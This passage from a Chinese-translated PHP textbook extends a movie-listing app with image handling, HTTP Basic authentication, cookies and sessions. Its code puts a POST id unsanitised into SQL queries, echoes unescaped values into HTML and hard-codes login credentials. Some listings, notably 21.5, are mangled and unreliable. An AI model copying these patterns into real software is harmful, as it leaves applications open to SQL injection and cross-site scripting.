            action="<?php echo $_SERVER['PHP_SELF'] ?> ">
            <div class="form-group row">
                <label for="movie_title"
                    class="col-sm-3 col-form-label-lg">Title</label>
                <div class="col-sm-9">
                    <input type="text" class="form-control"
                        id="movie_title" name="movie_title"
                        value="<?php echo $movie_title ?>"
                        placeholder="Title" required>
                    <div class="invalid-feedback">
                        Please provide a valid movie title.
                    </div>
                </div>
            </div>
            <div class="form-group row">
                <label for="movie_rating"
                    class="col-sm-3 col-form-label-lg">Rating</label>
                <div class="col-sm-9">
                    <select class="custom-select"
                        id="movie_rating"
                        name="movie_rating"
```

### 向编辑页面添加图片文件上传功能

```php
value='<?= $movie_rating ?>'
required
<option value="" disabled selected>
Rating...
</option>
<option value="G" <?= $movie_rating == 'G' ? 'selected' : '' ?>>G</option>
<option value="PG" <?= $movie_rating == 'PG' ? 'selected' : '' ?>>PG</option>
<option value="PG-13" <?= $movie_rating == 'PG-13' ? 'selected' : '' ?>>PG-13</option>
<option value="R" <?= $movie_rating == 'R' ? 'selected' : '' ?>>R</option>
</select>
<div class="invalid-feedback">
Please select a movie rating.
</div>
</div>
</div>
<div class="form-group row">
<label for="movie_director"
class="col-sm-3 col-form-label-lg">Director</label>
<div class="col-sm-9">
<input type="text" class="form-control" id="movie_director"
name="movie_director" value="<?= $movie_director ?>"
placeholder="Director" required>
<div class="invalid-feedback">
Please provide a valid movie director.
</div>
</div>
</div>
<div class="form-group row">
<label for="movie_running_time_in_minutes"
class="col-sm-3 col-form-label-lg">Running Time (min)</label>
<div class="col-sm-9">
<input type="number" class="form-control"
id="movie_running_time_in_minutes"
name="movie_running_time_in_minutes"
value="<?= $movie_runtime ?>"
placeholder="Running time (in minutes)"
required>
<div class="invalid-feedback">
Please provide a valid running time in minutes.
</div>
</div>
</div>
<div class="form-group row">
<label class="col-sm-3 col-form-label-lg">Genre</label>
<div class="col-sm-9">
<?php
foreach ($genres as $genre) {
?>
    <div class="form-check form-check-inline col-sm-3">
        <input class="form-check-input"
            type="checkbox"
            id="movie_genre_checkbox_action_<?php echo $genre ?>"
            name="movie_genre_checkbox[]"
            value="<?php echo $genre ?>"
            <?php echo in_array($genre, $checked_movie_genres) ? 'checked' : '' ?>
        <label class="form-check-label"
            for="movie_genre_checkbox_action_<?php echo $genre ?>"
        ><?php echo $genre ?></label>
    </div>
<?php
}
?>
    </div>
    </div>
    <div class="form-group row">
        <label for="movie_image_file"
            class="col-sm-3 col-form-label-lg">Movie Image File</label>
        <div class="col-sm-8">
            <input type="file" class="form-control-file" id="movie_image_file"
                name="movie_image_file">
        </div>
    </div>
    <button class="btn btn-primary" type="submit"
        name="edit_movie_submission">Update Movie
    </button>
    <input type="hidden" name="id_to_update" value="<?php echo $id_to_edit ?>">
    <input type="hidden" name="movie_image_file"
        value="<?php echo $movie_image_file ?>">
    </form>
    </div>
    <div class="col-3">
        <img src="<?php echo $movie_image_file_displayed ?>" class="img-thumbnail"
            style="max-height: 400px;" alt="Movie Image">
    </div>
    </div>
    <script>
    // JavaScript for disabling form submissions if there are invalid fields
    (function () {
        'use strict';
        window.addEventListener('load', function () {
            // Fetch all the forms we want to apply custom Bootstrap validation styles to
            var forms = document.getElementsByClassName('needs-validation');
            // Loop over them and prevent submission
            var validation = Array.prototype.filter.call(forms, function (form) {
                form.addEventListener('submit', function (event) {
                    if (form.checkValidity() === false) {
                        event.preventDefault();
                        event.stopPropagation();
                    }
                    form.classList.add('was-validated');
                }, false);
            });
        }, false);
    })();
    </script>
    </div>
    </div>
    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"
        integrity="sha384-q8i/X+965Dz0rT7abK41JStQIAqVgRVzpbzo5snXKp4YfRvH+8abtTE1Pi6jizo"
        crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"
        integrity="sha384-wHAiF1Rpf4etG03wPF2yD3e..."
        crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/js/bootstrap.min.js"
        integrity="sha384-B0Uglyr..."
        crossorigin="anonymous"></script>
</body>
</html>
```

### 在删除页面上显示图片

最后，我们需要修改 removemovie.php，以便在“移除影片”页面上显示影片图片，从而更好地识别影片。在确认删除时，我们需要从数据库和文件系统中删除图片文件。我们将把图片添加到表格的左侧，使其看起来像图 19.26 所示。

打开 removemovie.php，在脚本顶部引用 dbconnection.php 的后面，添加以下 require_once() 来引用 movieimagefileutil.php 脚本：

```php
<?php
    require_once('dbconnection.php');
    require_once('movieimagefileutil.php');
```

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_289_0.png)

### 在 removiemovie.php 上显示图片

最初链接到“移除影片”页面（removiemovie.php）时，是由于从 index.php 脚本导航时选择了垃圾桶图标而发起 HTTP GET 请求/响应。因此，我们需要在 elseif (isset($_GET['id_to_delete'])) 代码块中进行以下修改，以显示影片图片文件的详细信息：

```php
elseif (isset($_GET['id_to_delete'])):
 // ...
 if (mysqli_num_rows($result) == 1)
 {
  $row = mysqli_fetch_assoc($result);
  $movie_image_file = $row['image_file'];
  if (empty($movie_image_file))
  {
   $movie_image_file = ML_UPLOAD_PATH . ML_DEFAULT_MOVIE_FILE_NAME;
  }
 }
```

与我们在 addmovie.php 和 editmovie.php 中所做的一样，我们需要将影片图片文件（或默认图片）添加到表格的左侧，以显示影片详细信息。

因为我们使用的是 Bootstrap 的 Flexbox 网格实现，所以我们可以将图片和表格封装在单独的列中，并将它们放入同一行。所有这些都位于 <h1> 元素中的影片标题下方，如清单 19.34 所示。

```php
<h1><?= $row['title'] ?></h1>
<div class="row">
 <div class="col-2">
  <img src=... class="img-thumbnail" style="max-height: 200px;" alt="Movie image">
 </div>
</div>
<div class="col">
 ...
```


```
<table class="table table-striped">
...
</table>
</div>
</div>
</p>
<form ... >
```

再次注意，我们将 style 属性设置为最大高度 200 像素。

## 删除电影时移除电影图像

在用户通过选择“Delete Movie”按钮提交表单数据后，如图 19.27 所示，以下条件为真。这是因为用户选择了“Delete Movie”提交按钮，该按钮将表单变量 delete_movie_submission 和 id 以 $_POST[] 超全局数组的形式回传到 removemovie.php。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_291_0.png)

```
if (isset($_POST['delete_movie_submission']) && isset($_POST['id'])):
```

在此块中，在我们查询删除此电影之前，我们需要从 movieListing 数据库表中查询 image_file 字段，并在 images/ 文件夹中删除图像——仅当 image_file 字段不为空时才通过调用 removeMovieImageFile()。请在清单 19.35 中进行代码修改。

清单 19.35.

```
if (isset($_POST['delete_movie_submission']) && isset($_POST['id'])):

$id = $_POST['id'];

// Query image file from DB
$query = "SELECT image_file FROM movieListing WHERE id = $id";

$result = mysqli_query($dbc, $query)
    or trigger_error(
        'Error querying database movieListing', E_USER_ERROR
    );

if (mysqli_num_rows($result) == 1)
{
    $row = mysqli_fetch_assoc($result);

    $movie_image_file = $row['image_file'];

    if (!empty($movie_image_file))
```

## 19. 处理文件和对现有代码的功能添加

```
20.     {
21.         removeMovieImageFile($movie_image_file);
22.     }
23. }
24.
25. $query = "DELETE FROM movieListing WHERE id = $id";
26.
27. $result = mysqli_query($dbc, $query)
28.     or trigger_error(
29.         'Error querying database movieListing', E_USER_ERROR
30.     );
31.
32. header("Location: index.php");
33. exit;
```

## 完整的 removemovie.php 清单

清单 19.36.

```
1. <html>
2. <head>
3.     <title>Remove a Movie</title>
4.     <link rel="stylesheet"
5.         href="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/css/bootstrap.min.css"
6.         integrity="sha384-GJzZqFGwbQ1TTNyGwy59ffF1BuGJpLSa9DkKmp0Dgi/Dn4iVMj7oZgZKVbI70e4t/S"
7.         crossorigin="anonymous">
8.     <link rel="stylesheet"
9.         href="https://use.fontawesome.com/releases/v5.8.1/css/all.css"
10.        integrity="sha384-50bUHMevpQ6fxV12ZB4EF1Qzzqfh2cXFjTjwX..."
11.        crossorigin="anonymous">
12. </head>
13. <body>
14. <div class="card">
15.     <div class="card-body">
16.         <h1>Remove a Movie</h1>
17. <?php
18.     require_once('dbconnection.php');
19.     require_once('movieimagefileutil.php');
20.
21. $dbc = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME)
22.     or trigger_error(
23.         'Error connecting to MySQL server for' . DB_NAME,
24.         E_USER_ERROR
25.     );
26.
27. if (isset($_POST['delete_movie_submission']) && isset($_POST['id'])):
28.
29.     $id = $_POST['id'];
30.
```

## 19. 处理文件和对现有代码的功能添加

```
```php
if (mysqli_num_rows($result) == 1) {
    $row = mysqli_fetch_assoc($result);

    $movie_image_file = $row['image_file'];

    if (empty($movie_image_file)) {
        $movie_image_file =
            ML_UPLOAD_PATH . ML_DEFAULT_MOVIE_FILE_NAME;
    }
?>
<h1><?= $row['title'] ?></h1>
<div class="row">
    <div class="col-2">
        <img src="<?= $movie_image_file ?>"
             class="img-thumbnail"
             style="max-height: 200px;"
             alt="Movie image">
    </div>
    <div class="col">
        <table class="table table-striped">
            <tbody>
                <tr>
                    <th scope="row">Rating</th>
                    <td><?= $row['rating'] ?></td>
                </tr>
                <tr>
                    <th scope="row">Director</th>
                    <td><?= $row['director'] ?></td>
                </tr>
                <tr>
                    <th scope="row">Running Time (minutes)</th>
                    <td><?= $row['running_time_in_minutes'] ?></td>
                </tr>
                <tr>
                    <th scope="row">Genre</th>
                    <td><?= $row['genre'] ?></td>
                </tr>
            </tbody>
        </table>
    </div>
</div>
<p>
<form method="POST"
      action="<?= $_SERVER['PHP_SELF'] ?>">
    <div class="form-group row">
        <div class="col-sm-2">
            <button class="btn btn-danger" type="submit"
                    name="delete_movie_submission">
                Delete Movie
            </button>
        </div>
    </div>
</form>
```
```

## 第 20 章

## 基本 HTTP 身份验证

> > “首先，解决问题。然后，再编写代码。”
> >
> > —John Johnson

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_297_0.png)

## 20. 基本 HTTP 身份验证

目前，我们的 *MovieListing* 应用程序没有任何保护，任何人都可以简单地删除我们数据库中的所有电影，或添加我们可能不批准的电影条目。

在本章中，我们实现基本 HTTP 身份验证，为我们不希望向所有人公开的应用程序功能增加一层保护。

在后续的关于安全的章节中，我将进一步讨论身份验证和授权。基本 HTTP 身份验证是控制谁可以使用特定网页的一种简单方法。

问题是，我们希望对哪些功能要求身份验证？鉴于我们的应用程序允许任何人访问整个网站，我们需要对修改或删除应用程序数据的任何功能添加基本身份验证。这将限制只有知道有效用户名和密码组合的可信用户才能更改数据库。因此我们将要求对以下内容进行身份验证：

- `addmovie.php`
- `removemovie.php`
- `editmovie.php`

## 使用 HTTP 身份验证的密码保护

用户应该能够通过单击图 20.1 所示的链接添加电影，删除电影（图 20.2），或通过图 20.3 中的链接编辑电影详细信息。在执行这些操作之前，我们希望显示图 20.4 所示的授权对话框，或类似的对话框，以验证其身份。您看到的确切对话框因浏览器和操作系统而异。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_298_0.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_298_1.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_298_2.png)

### HTTP 身份验证是如何工作的？

只要用户输入错误的凭据，该对话框就会继续弹出。只有使用正确的凭据登录后，用户才能添加、编辑或删除电影详细信息。

如果用户按下“取消”，图 20.5 中的消息会显示在页面上。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_299_0.png)

### HTTP 身份验证是如何工作的？

HTTP 身份验证使用 HTTP 头发送。每次用户请求网页时，在返回任何 HTML 之前，服务器都会向客户端发送用于验证用户身份的头。您应该注意，虽然您可以使用 HTTP 进行基本身份验证，但用户名和密码未加密，可能会被拦截。如果您必须使用基本身份验证，请确保在生产站点上使用 HTTPS。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_299_1.png)

头控制客户端和服务器之间传递的信息类型和方式。头通常（但不总是）由冒号 (:) 分隔的名称/值对组成。

> > 注意：有关 HTTP 请求和响应头的更多信息，请参阅第 1 章：HTTP 请求/响应

在 PHP 中，我们使用 header() 函数创建 HTTP 头并将其从脚本发送出去。

由于头必须在任何 HTML 标记之前发送，因此它必须是 PHP 代码中的第一件事。<?php 标签之前不能有任何空行。此外，在 header() 调用之前您包含或引用的任何其他文件都不得向浏览器发送任何输出。

```
[1] header(): https://php.net/header
```




## 20. 基本 HTTP 身份验证

### 认证所需的标头

只要密码和用户名不正确或缺失，我们的脚本就会发送这两个标头：

```
header('HTTP/1.1 401 Unauthorized');
header('WWW-Authenticate: Basic realm="Movies I Like"');
```

> 请注意，Basic realm 用于标识此身份验证。因此，只要 Basic realm 设置得不同，就可以用不同的凭据保护不同的网页。你可以在这里使用任何你想要的文本，但要确保对用户来说是明确的。

> 也就是说，一旦某个页面成功通过了身份验证，应用程序中任何使用相同 Basic realm 的其他网页都会自动通过验证，无需再次输入凭据。

### $_SERVER 超全局变量中的凭据

当用户在身份验证请求对话框中输入用户名和密码时，浏览器会将凭据发送到你的 PHP 脚本。这些凭据会被解析并添加到超全局变量 `$_SERVER` 中（图 20.6）。然后，我们的代码会使用这些值来验证凭据：

- 用户名保存在 `$_SERVER['PHP_AUTH_USER']` 中
- 密码保存在 `$_SERVER['PHP_AUTH_PW']` 中

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_300_0.png)

### 创建 authorizeaccess.php

由于我们只会使用一个 Basic realm，因此创建一个处理授权的单一 PHP 脚本是合理的。因此，我们将创建一个名为 `authorizeaccess.php` 的脚本。

由于 HTTP 身份验证是通过 Header 发送的，我们需要确保在发送授权标头之前没有空行。因此，请确保你的 `<?php` 起始标签位于脚本顶部，并紧靠左边缘：

```
<?php
```

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_302_0.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_302_1.png)

第一次调用此脚本时，`$_SERVER['PHP_AUTH_USER']` 和 `$_SERVER['PHP_AUTH_PW']` 都未设置，因此会显示授权对话框。如果用户输入了错误的凭据并按下 Sign In（图 20.7），`authorizeaccess.php` 脚本会再次被调用。由于凭据不匹配，代码再次满足 if 语句的条件，并再次发送授权标头。

当用户提交正确的凭据时，`authorizeaccess.php` 脚本会再次被调用。这一次，之前的 if 语句不会触发，脚本会继续执行。

我们需要处理的最后一种情况是用户在授权对话框中选择 Cancel（图 20.8）。

我们希望在页面上显示一条消息，告诉他们需要输入有效的用户名和密码，然后退出我们的应用程序。因此，在代码的两行 `header()` 之后添加以下代码：

```
```php
header('HTTP/1.1 401 Unauthorized');
header('WWW-Authenticate: Basic realm="Movies I Like"');

$invalid_response = "<h2>Movies I Like</h2><h4>You must enter a " . "valid username and password to access this page.</h4>";
exit($invalid_response);
```
```

如果用户选择 Cancel，他们的页面请求不会包含任何访问凭据。这样做会调用 `exit()` 函数，退出应用程序，并显示 `$invalid_response` 的内容。

### authorizeaccess.php 的完整代码清单

### 清单 20.2

```
```php
<?php
$username = 'movieguru';
$password = 'illikemovies';

// IF Password OR Username are empty
// OR Password OR Username don't match

if (!isset($_SERVER['PHP_AUTH_USER']) || !isset($_SERVER['PHP_AUTH_PW']) ||
    $_SERVER['PHP_AUTH_USER'] !== $username ||
    $_SERVER['PHP_AUTH_PW'] !== $password) {

header('HTTP/1.1 401 Unauthorized');
header('WWW-Authenticate: Basic realm="Movies I Like"');

$invalid_response = "<h2>Movies I Like</h2><h4>You must enter a "
. "valid username and password to access this page.</h4>";

exit($invalid_response);

}
```
```

### 向页面添加授权

将新的授权要求添加到 `addmovie.php`、`removeMovie.php` 和 `editmovie.php` 脚本中非常简单。只需在开头的 `<html>` 元素标签之前，用 `require_once()` 调用包含 `authorizeaccess.php` 脚本：

```
```php
<?php
require_once('authorizeaccess.php');
?>

<!DOCTYPE html>
<html>
<head>
```
```

在任何需要身份验证的页面上，`require_once('authorizeaccess.php')` 都应该是脚本中的第一件事。这样，在用户尝试执行任何更改数据库的操作之前，必须先进行身份验证。

### 练习

- 1. 创建一个 `authorizeaccess.php` 脚本来处理身份验证，并将其添加到需要经过身份验证的用户才能访问的页面中。
- 2. 修改 `authorizeaccess.php`，使其接受两个或更多用户名和密码组合。
- 3. 修改 `authorizeaccess.php`，使其接受两个或更多用户名和密码组合。

## 章节

## 21

## 持久化

> “用代码行数来衡量编程进度，就像用重量来衡量飞机制造进度一样。”

> ——比尔·盖茨

## 21. 持久化

持久化。这是一个大词。如果我们需要记住用户的姓名以及他们是否已登录，该怎么办？在第 18 章中，我提到过 Web 是无状态的。到目前为止，为了从之前的 HTTP 请求中携带数据，我们需要将这些数据保存在表单的隐藏变量中。这种方法是一种脆弱的持久化形式，因为如果我们希望这些数据在另一个 HTTP GET 或 POST 请求中继续存在，就必须记得在未来的请求中始终包含我们的隐藏变量。如果我们能有一种更好的机制，以更少的精力持久化我们的数据，并能在多个 HTTP GET 或 POST 请求中使用它，那岂不是很棒？在 Web 开发中，有三种机制可以用来持久化数据：Cookie、会话变量和数据库。我们已经在使用数据库了。本章将重点介绍 Cookie 和会话变量，它们的使用方法以及使用它们的最佳实践。

### Cookie

Cookie 允许将小段字符串数据持久化在客户的浏览器上，它们有时间限制，并且可以随时删除。Cookie 的组成部分（图 21.1）包括：

- 名称：Cookie 的唯一名称
- 值：存储在 Cookie 中的值
- 过期日期：Cookie 过期的日期和时间

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_306_0.png)

Cookie 的有效期取决于其设置的过期日期和时间。如果你没有设置 Cookie 的过期日期和时间，它会一直持续到用户关闭浏览器会话为止。出于安全和隐私考虑，Cookie 只能由设置它的网站读取或修改。

> 我们所说的“小”是什么意思？大多数浏览器将 Cookie 的最大大小限制为 4096 字节。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_308_0.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_308_1.png)

在输入你最喜欢的 Cookie 并按下 **Submit** 按钮后，用户最喜欢的 Cookie 会被保存到一个 Cookie 中。然后，我们就可以在网页上用一句话显示 Cookie 的值。页面应该看起来像图 21.4。

创建一个名为 `cookies.php` 的 PHP 脚本，并使用清单 21.1 中的条件逻辑，从第一个表单，到下一个表单，再到最后一个有输出短句的页面，该短句使用了已保存的 Cookie。

### 清单 21.1.

```
```php
<body>
<div class="card">
    <div class="card-body">
        <h1>Using Cookies</h1>
        <?php
        // User entered name. Save name to Cookie and display form
        if (isset($_POST['name_submission']) && isset($_POST['entered_name'])) {
            setcookie('name', $_POST['entered_name']);
            // ...
        } // User entered favorite cookie, save favorite cookie and redirect to this page
        elseif (isset($_POST['cookie_submission']) && isset($_POST['entered_cookie'])) {
            setcookie('favorite_cookie', $_POST['entered_cookie']);

            header("Location: {$_SERVER['PHP_SELF']}");
            exit;
        } // Output message displaying saved Cookies then delete the Cookies
        elseif (isset($_COOKIE['name']) && isset($_COOKIE['favorite_cookie'])) {
            // ...
            setcookie('name', '', time() - 3600);
            setcookie('favorite_cookie', '', time() - 3600);
        } // Initial navigation to this page, display form asking for name
        else {
            // ...
        }
        ?>
    </div>
</div>
...
</body>
```
```




最后一个 else 子句是初始导航到此页面的开始位置，因此我们希望在此处显示用于询问姓名的表单，代码见清单 21.2。

## 清单 21.2.

```
1. else
2. {
3.     ?>
4.     <form class="needs-validation" novalidate method="POST"
5.         action="<?php echo $_SERVER['PHP_SELF'] ?>">
6.         <div class="form-group">
7.             <label for="name"><h4>What is your name?</h4></label>
8.             <input type="text" class="form-control" id="entered_name"
9.                 name="entered_name" placeholder="Enter your name" required>
10.        </div>
11.        <button type="submit" class="btn btn-primary"
12.            name="name_submission">Submit</button>
13.    </form>
14.    <?php
15. }
```

由于此脚本包含多个表单，并且它们都将 POST 到 $_SERVER['PHP_SELF']，因此我们在每个表单的提交按钮上使用不同的 name 属性。

一旦用户提交此表单，执行将在 if 子句中开始，在那里我们将为输入的姓名设置一个 cookie：

```
if (isset($_POST['name_submission']) && isset($_POST['entered_name']))
{
    setcookie('name', $_POST['entered_name']);
}
```

在 if 子句中的 setcookie() 函数之后，我们希望显示以下表单，询问用户最喜欢的 cookie。见清单 21.3

## 清单 21.3.

```
1. if (isset($_POST['name_submission']) && isset($_POST['entered_name']))
2. {
3.     setcookie('name', $_POST['entered_name']);
4.     ?>
5. <form class="needs-validation" novalidate method="POST"
6.     action="<?php echo $_SERVER['PHP_SELF'] ?>">
7.     <div class="form-group">
8.         <label for="name"><h4>What is your favorite cookie?</h4></label>
9.     <input type="text" class="form-control" id="entered_cookie"
10.         name="entered_cookie" placeholder="Enter a cookie you like to eat"
11.         required>
12. </div>
13. <button type="submit" class="btn btn-primary"
14.     name="cookie_submission">Submit</button>
15. </form>
16. <?php
17. }
```

同样，注意我们正在 POST 到 $_SERVER['PHP_SELF']，因此我们为此表单的提交按钮使用不同的 name 属性。这样做让我们可以跟踪用户正在提交哪个表单。

一旦用户提交此表单，执行将在第一个 elseif 子句中开始，在那里我们为输入的最喜欢的 cookie 设置一个名为 favorite_cookie 的 cookie：

```
elseif (isset($_POST['cookie_submission']) && isset($_POST['entered_cookie']))
{
    setcookie('favorite_cookie', $_POST['entered_cookie']);
    header("Location: {$_SERVER['PHP_SELF']}");
    exit;
}
```

此代码保存最喜欢的 cookie 并将浏览器重定向到 $_SERVER['PHP_SELF']。请记住，直到我们向用户浏览器发送响应，cookie 才会被设置，并且该值在 $_COOKIE 超全局变量中不存在。我们可以通过检查两个 cookie 是否存在来区分直接导航到此脚本（显示第一个表单）的行为。

接下来，执行在第二个 elseif 子句中开始，在那里我们希望输出使用已保存 cookie 的短语：

```
elseif (isset($_COOKIE['name']) && isset($_COOKIE['favorite_cookie']))
{
    // ...
    setcookie('name', '', time() - 3600);
    setcookie('favorite_cookie', '', time() - 3600);
}
```

注意两次对 setcookie() 的调用。这些调用将时间回退一小时（以秒为单位），这会告诉浏览器删除 cookie。

## Cookies

在对 setcookie() 的调用正上方，我们希望输出一个短语，其中包含保存在 cookie 中的输入姓名和最喜欢的 cookie。由于我们输出的是用户提供的字符串，因此必须对其进行转义以防止跨站脚本攻击，我们将在 [安全章节](#) 中稍后介绍。

## 清单 21.4.

```php
elseif (isset($_COOKIE['name']) && isset($_COOKIE['favorite_cookie']))
{
?>
<h4>
    Hey <?= htmlspecialchars($_COOKIE['name']) ?>, you like
    <?= htmlspecialchars($_COOKIE['favorite_cookie']) ?> cookies. Very nice!
</h4>
<?php
    setcookie('name', '', time() - 3600);
    setcookie('favorite_cookie', '', time() - 3600);
}
```

## 完整的 cookies.php 代码清单

> > *此脚本使用 Bootstrap 的表单客户端验证，并需要特殊的 CSS 类和 JavaScript 函数。有关使用 Bootstrap 的客户端验证的更多信息，请参阅 [第16章：使用 Bootstrap 的客户端验证](#)*

## 清单 21.5.

```html
<html>
<head>
    <title>Using Cookies</title>
    <link rel="stylesheet"
          href="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/css/bootstrap.min.css"
          integrity="sha384-GJzZQFQwbQ1TN6wy59FF1BUgJpLSa9DKkMP0dgUm4YmJ70gZWKyBI706tWS"
          crossorigin="anonymous">
</head>
<body>
<div class="card">
    <div class="card-body">
        <h1>Using Cookies</h1>
        <?php
        // User entered name, save name to Cookie and display form asking for favorite cookie
        if (isset($_POST['name_submission']) && isset($_POST['entered_name'])) {
            setcookie('name', $_POST['entered_name']);
```
```
<?php
// User entered favorite cookie, save favorite cookie to Cookie and redirect to this page
elseif (isset($_POST['cookie_submission']) && isset($_POST['entered_cookie'])) {
	setcookie('favorite_cookie', $_POST['entered_cookie']);
	header("Location: {$_SERVER['PHP_SELF']}");
	exit;
}

// Output message displaying saved Cookies then delete the Cookies
elseif (isset($_COOKIE['name']) && isset($_COOKIE['favorite_cookie'])) {
	?>
	<h4>Hey <?= htmlspecialchars($_COOKIE['name']) ?>, you like <?= htmlspecialchars($_COOKIE['favorite_cookie']) ?> cookies. Very nice!</h4>
	<?php
	setcookie('name', '', time() - 3600);
	setcookie('favorite_cookie', '', time() - 3600);
}

// Initial navigation to this page, display form asking for name
else {
	?>
	<form class="needs-validation" novalidate method="POST" action="<?php echo $_SERVER['PHP_SELF']; ?>">
		<div class="form-group">
			<label for="name">What is your name?</label>
			<input type="text" class="form-control" id="entered_name" name="entered_name" placeholder="Enter your name" required>
		</div>
		<button type="submit" class="btn btn-primary" name="name_submission">Submit</button>
	</form>
	<?php
}

?>

<form class="needs-validation" novalidate method="POST" action="<?php echo $_SERVER['PHP_SELF']; ?>">
	<div class="form-group">
		<label for="name">What is your favorite cookie?</label>
		<input type="text" class="form-control" id="entered_cookie" name="entered_cookie" placeholder="Enter a cookie you like to eat" required>
	</div>
	<button type="submit" class="btn btn-primary" name="cookie_submission">Submit</button>
</form>
	<?php
}

?>
```
```html
63.             </button>
64.             </form>
65.             <?php
66.         }
67.         ?>
68.     </div>
69. </div>
70. <script>
71. // JavaScript for disabling form submissions if there are invalid fields
72. (function () {
73.     'use strict';
74.     window.addEventListener('load', function () {
75.         // Fetch all the forms we want to apply custom Bootstrap validation styles to
76.         var forms = document.getElementsByClassName('needs-validation');
77.         // Loop over them and prevent submission
78.         var validation = Array.prototype.filter.call(forms, function (form) {
79.             form.addEventListener('submit', function (event) {
80.                 if (form.checkValidity() === false) {
81.                     event.preventDefault();
82.                     event.stopPropagation();
83.                 }
84.                 form.classList.add('was-validated');
85.             }, false);
86.         });
87.     }, false);
88. })();
89. </script>
90. <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"
91.         integrity="sha384-q8i/X+965DzO0rT7abK4lJStQIAdqGVzpbzo5SnXKpYVFVH+8abtTE1Pj6jizo"
92.         crossorigin="anonymous"></script>
93. <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"
94.         integrity="sha384-wHAiF..."
95.         crossorigin="anonymous"></script>
96. <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/js/bootstrap.min.js"
97.         integrity="sha384-B0Ugly..."
98.         crossorigin="anonymous"></script>
99. </body>
100. </html>
```



## 会话变量

会话变量也允许持久保存少量数据。然而，与将其存储在客户端浏览器中不同，它们存储在服务器上，从而在防止用户篡改数据方面提供了额外的安全优势。它们也不限于存储字符串数据。您可以持久保存数组、变量和可序列化对象，PHP 解释器会在脚本之间自动转换它们。然而，会话变量仅在当前网页浏览会话期间存在。换句话说，会话在用户关闭浏览器时结束。当会话结束时，$_SESSION 变量会被销毁。

使用会话变量时，您必须通过使用函数 session_start()[3] 来指示会话何时开始：

```
session_start();
```

首次调用 session_start() 时，没有数据被保存。它仅表示 PHP 解释器可以开始存储和访问会话变量，并且在内部为此会话设置一个唯一标识符。Web 浏览器和我们的应用程序使用此唯一标识符将一个会话与多个网页关联起来。

会话标识符在会话关闭之前不会被销毁。这发生在 Web 浏览器关闭时或调用 session_destroy() 函数时：

```
session_destroy();
```

如果您使用 session_destroy()[4] 函数自行关闭会话，它不会删除会话变量。相反，它仅结束会话。

创建会话变量时，您使用 $_SESSION[] 超全局变量：

```
$_SESSION['user_name'] = 'kenmarks';
```

您通过使用分配的索引访问 $_SESSION 超全局变量[5] 来使用会话变量以检索其值：

```
<p class="login">You are logged in as <?= $_SESSION['user_name'] ?>.</p>; 
```

[3] session_start(): https://php.net/session_start
[4] session_destroy(): https://php.net/session_destroy
[5] $_SESSION superglobal: https://php.net/reserved.variables.session

使用会话变量有几点有趣之处。首先，您必须在创建和访问会话变量之前调用 session_start()。其次，在从一个页面链接到另一个页面（或同一页面）时，您必须记住 Web 是无状态的。要访问您创建的任何会话变量，您必须再次调用 session_start() 函数。

> session_start() 的命名是不幸的。当开发人员首次学习如何在 PHP 中使用会话变量时，他们通常假设一旦调用 session_start()，就不需要再次调用它——即使 Web 是无状态的。他们会疑惑为什么在后续请求中无法访问其会话变量。这个函数的更准确名称可能是：session_start_or_resume()。

第三，如上所述，调用 session_destroy() 仅结束会话，但不会删除会话变量。在用户关闭浏览器并且 PHP 的会话垃圾回收器删除过期会话数据之前，您不能依赖任何数据被删除。为了确保会话变量被删除，请在销毁会话后立即将 $_SESSION[] 超全局变量设置为空数组：

```
session_destroy();
$_SESSION = []; // Destroy all session variables in the current session
```

## 会话示例

为了展示如何使用会话，让我们重写我们最喜欢的 cookie 应用程序，使其使用会话变量而不是 cookie。

复制 cookies.php 并将其命名为 sessionvariables.php。将 <head> 元素部分内的 <title> 元素中的内容以及 <body> 元素部分内的 <h1> 内容从 Using Cookies 改为 Using Session Variables：

在脚本顶部添加对 session_start() 的调用。您应该尽早调用此函数，并在发送任何 HTML 输出之前调用，以防止 Web 服务器警告。

```
<?php
    session_start(); // Start or resume the current session so we can access session variables
?>

<title>Using Session Variables</title>

    <h1>Using Session Variables</h1>
```

## 21. 持久性

在第一个 if 子句正上方，将注释更改为引用 $_SESSION 变量而不是 $_COOKIE：

```
<?php
// User entered name, save name to Session variable and display form asking for favorite cookie
if (isset($_POST['name_submission']) && isset($_POST['entered_name']))
{
```

一旦您调用了 session_start，设置会话变量不需要调用特殊函数。接下来，用会话变量的创建替换对 setcookie() 的调用。

```
// User entered name, save name to Session variable and display form asking for favorite cookie
if (isset($_POST['name_submission']) && isset($_POST['entered_name']))
{
    $_SESSION['name'] = $_POST['entered_name'];
```

在第一个 elseif 子句之前，将注释更改为引用会话变量而不是 cookie。在此 elseif 子句中，用会话变量的创建替换对 setcookie() 的调用：

```
// User entered favorite cookie, save favorite cookie to Session variable and route to this page
elseif (isset($_POST['cookie_submission']) && isset($_POST['entered_cookie']))
{
    $_SESSION['favorite_cookie'] = $_POST['entered_cookie'];
```

在最后一个 elseif 子句之前，添加以下注释以替换引用 cookie 的注释：

```
// Output message displaying saved Session variables
// then end the current session and delete the Session variables
